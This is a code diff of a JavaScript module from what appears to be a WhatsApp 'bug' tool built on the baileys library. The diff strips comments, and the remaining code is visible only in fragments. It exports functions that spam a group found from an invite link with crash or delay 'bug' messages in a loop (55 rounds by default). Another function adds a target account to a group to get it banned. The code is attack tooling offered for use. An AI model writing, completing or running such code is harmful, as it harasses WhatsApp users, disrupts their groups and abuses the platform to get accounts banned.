@@ -1,5 +1,3 @@
-// src/services/bug/group.js — varian grup + banned group.
-// Diekstrak dari hasil_date.js: DelayGB, blankclickgb, bandgroup.
 import { generateWAMessageFromContent } from "baileys";
 import { sleep, resolveGroupTarget, runGroupSpam } from "./helpers.js";
 
@@ -74,10 +72,6 @@ export async function blankclickgb(sock, target) {
   });
 }
 
-/**
- * Eksekutor generik bug grup dari link invite.
- * `combo` = "blank" | "delay" | "combo"
- */
 export async function sendGroupBugFromLink(sock, link, combo = "delay", opts = {}) {
   const target = await resolveGroupTarget(sock, link);
   const totalLoop = opts.totalLoop ?? 55;
@@ -116,9 +110,6 @@ export const sendGroupDelay = (sock, link, opts) =>
 export const sendGroupCombo = (sock, link, opts) =>
   sendGroupBugFromLink(sock, link, "combo", opts);
 
-/**
- * bandgroup — coba add JID target ke grup dari link (efek banned).
- */
 export async function sendBandGroup(sock, link, { targetMeta = "13135550002@s.whatsapp.net" } = {}) {
   const target = await resolveGroupTarget(sock, link);
   await sock.groupParticipantsUpdate(target, [targetMeta], "add");
